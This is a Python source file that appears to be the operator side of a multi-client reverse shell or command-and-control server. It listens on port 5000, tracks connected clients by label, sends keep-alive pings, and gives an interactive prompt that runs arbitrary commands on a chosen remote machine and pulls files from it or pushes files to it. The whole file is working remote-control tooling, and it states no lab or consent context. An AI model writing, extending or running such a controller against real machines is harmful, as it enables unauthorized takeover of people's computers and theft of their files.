from base64 import b64encode, b64decode
from threading import Thread
from os.path import exists
from socket import socket
from shlex import split
from time import sleep
from json import loads

host = '0.0.0.0'
port = 5000

type_png = 0 # ping
type_cmd = 1 # command
type_get = 2 # get file
type_put = 3 # put file
type_hds = 4 # connection handshake
type_out = 5 # output
type_rsp = 6 # response
type_cnt = 7 # file content
type_cwd = 8 # change working directory
type_gcd = 9 # get current directory

def read_file(path):
    with open(path, 'rb') as file:
        return file.read()
    
def make_file(path, content):
    with open(path, 'wb') as file:
        file.write(content)

class Socket():

    def __init__(self, host, port, sock, type_max=4, length_max=8, label=None):
        self.host = host
        self.port = port
        self.sock = sock
        self.type_max = type_max
        self.length_max = length_max
        self.label = label if label else port

    def send(self, type, data, timeout=None):
        self.sock.settimeout(timeout)
        
        compressed = b64encode(data)
        header = type.to_bytes(self.type_max) + len(compressed).to_bytes(self.length_max)

        self.sock.send(header + compressed)

    def recv(self, timeout=None):
        self.sock.settimeout(timeout)
        
        
        type = int.from_bytes(self.sock.recv(self.type_max))
        length = int.from_bytes(self.sock.recv(self.length_max))
        compressed = b''
        
        while len(compressed) < length:
            compressed += self.sock.recv(length-len(compressed))

        data = b64decode(compressed)
        return type, data
    
    def expect(self, expected, timeout=None):
        type, data = self.recv(timeout)

        if type == expected:
            return data
        
        else:
            raise ValueError('Unexpected value!')

class Server(Socket):

    def __init__(self, host, port, sock, type_max=4, length_max=8, label=None):
        super().__init__(host, port, sock, type_max, length_max, label)
        self.running = {'accept_thread': True, 'ping_thread': True}
        self.focus: Socket = None
        self.focus_cwd = None
        self.clients = {}
    
    def bind(self, backlog):
        self.sock.bind((self.host, self.port))
        self.sock.listen(backlog)

    def accept(self, timeout=None, timeout_hds=4):
        while True:
            self.sock.settimeout(timeout)

            try:
                accepted = self.sock.accept()
                client = Socket(accepted[1][0], accepted[1][1], accepted[0])

                try:
                    client.label = client.expect(type_hds, timeout_hds).decode()
                
                except (ValueError, TimeoutError, OverflowError, MemoryError):
                    client.sock.close()
                    continue
                
                if client.label in self.clients.keys():
                    client.label = str(client.port)

                self.clients[client.label] = client
                return client
            
            except ConnectionError:
                continue

            except TimeoutError:
                return

    def broadcast(self, type, data, timeout=4):
        clients = self.clients.copy().values()

        for client in clients:
            try:
                client.send(type, data, timeout)

            except ConnectionError:
                self.clients.pop(client.label)

            except TimeoutError:
                self.clients.pop(client.label).close()

    def accept_thread(self):
        while self.running['accept_thread']:
            self.accept()

    def ping_thread(self, interval=30):
        while self.running['ping_thread']:
            self.broadcast(type_png, b'keep-alive-ping')
            sleep(interval)

server = Server(host, port, socket())
server.bind(4)

print('Waiting for inital connection . . .')
server.focus = server.accept()
print(f'Connected to {server.focus.label}! ({server.focus.host}:{server.focus.port})')

Thread(target=server.ping_thread).start()
Thread(target=server.accept_thread).start()

while True:
    server.focus.send(type_gcd, b'_')
    server.focus_cwd = server.focus.expect(type_gcd).decode()

    try:
        command = input(f'[{server.focus.label}] {server.focus_cwd}>> ')
        sliced = split(command)

    except ValueError:
        print('Syntax error in command.')
        continue

    if not sliced:
        continue

    elif sliced[0].lower() == 'clients':
        try:
            new = sliced[1]

            if new in server.clients.keys():
                server.focus = server.clients[new]

            print(f'Client focus changed to {server.focus.label}!')

        except IndexError:
            print(f'Current: {server.focus.label}')
            print(f'Clients: {', '.join(server.clients)}')

        continue

    elif sliced[0].lower() == 'label':
        try:
            new = sliced[1]

        except IndexError:
            print('Invalid arguments!')
            continue
        
        for label, client in server.clients.items():
            if label == new:
                print('Label must be unique!')
                continue
        
        server.clients[new] = server.clients.pop(server.focus.label)
        server.focus.label = new
        
        print('New label added!')
        continue

    elif sliced[0].lower() == 'cd':
        try:
            new_dir = sliced[1]
        
        except IndexError:
            print('Invalid arguments!')
            continue

        server.focus.send(type_cwd, new_dir.encode())

    elif sliced[0].lower() == 'get':
        try:
            client_path = sliced[1]
            server_path = sliced[2]
        
        except IndexError:
            print('Invalid arguments!')
            continue

        server.focus.send(type_get, client_path.encode())
        file_exists = int(server.focus.expect(type_rsp))

        if file_exists:
            make_file(server_path, server.focus.expect(type_cnt))

    elif sliced[0].lower() == 'put':
        try:
            server_path = sliced[1]
            client_path = sliced[2]
        
        except IndexError:
            print('Invalid arguments!')
            continue

        if exists(server_path):
            server.focus.send(type_put, client_path.encode())
            server.focus.send(type_cnt, read_file(server_path))
        
        else:
            print('File not found!')
            continue
    
    else:
        server.focus.send(type_cmd, command.encode())

    output = loads(server.focus.expect(type_out))
    print(f'[Exit: {output[0]}]\n{output[1]}')